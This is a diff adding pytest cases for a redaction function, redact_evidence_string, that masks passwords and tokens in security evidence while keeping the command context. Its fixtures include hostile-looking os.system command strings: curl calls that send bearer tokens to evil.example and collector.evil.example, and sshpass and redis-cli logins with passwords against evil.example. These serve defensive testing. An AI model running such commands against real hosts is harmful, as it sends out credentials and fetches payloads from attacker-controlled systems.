@@ -105,6 +105,21 @@ def test_preserves_command_context_after_authorization_header_redaction() -> Non
     assert "token=<redacted>" in redacted
 
 
+def test_preserves_nested_command_url_after_quoted_authorization_redaction() -> None:
+    secret = "sk-nested-command-secret1234567890"
+    query_secret = "nested-query-secret"
+    text = f"os.system(\"curl -H 'Authorization: Bearer {secret}' https://evil.example/payload?token={query_secret}\")"
+
+    redacted = redact_evidence_string(text, max_chars=500)
+
+    assert secret not in redacted
+    assert query_secret not in redacted
+    assert "curl -H" in redacted
+    assert "evil.example/payload" in redacted
+    assert f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "token=<redacted>" in redacted
+
+
 def test_bare_authorization_value_redacts_token_before_context() -> None:
     """Authorization without a known scheme should redact the first token, not the following evidence."""
     text = "Authorization: sk-live-secret curl https://collector.evil.example/upload"
@@ -1290,6 +1305,45 @@ def test_command_context_literals_redact_credential_arguments() -> None:
         assert command_context in redacted
         assert "collector.evil.example" in redacted
         assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+@pytest.mark.parametrize(
+    ("text", "secret", "command_context"),
+    [
+        (
+            "os.system('sshpass -p hunter2 ssh user@evil.example id')",
+            "hunter2",
+            "sshpass -p <redacted> ssh user@evil.example id",
+        ),
+        (
+            "os.system('redis-cli -a hunter3 -h evil.example PING')",
+            "hunter3",
+            "redis-cli -a <redacted> -h evil.example PING",
+        ),
+    ],
+)
+def test_command_context_redacts_program_specific_short_password_options(
+    text: str,
+    secret: str,
+    command_context: str,
+) -> None:
+    redacted = redact_evidence_string(text, max_chars=500)
+
+    assert secret not in redacted
+    assert command_context in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "os.system('curl -p 8080 https://evil.example/path')",
+        "os.system('redis-cli -p 6379 -h evil.example PING')",
+        "os.system('ssh -p 22 user@evil.example id')",
+        "os.system('redis-cli --askpass -h evil.example PING')",
+    ],
+)
+def test_program_specific_short_password_near_matches_are_preserved(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=500) == text
 
 
 @pytest.mark.parametrize(
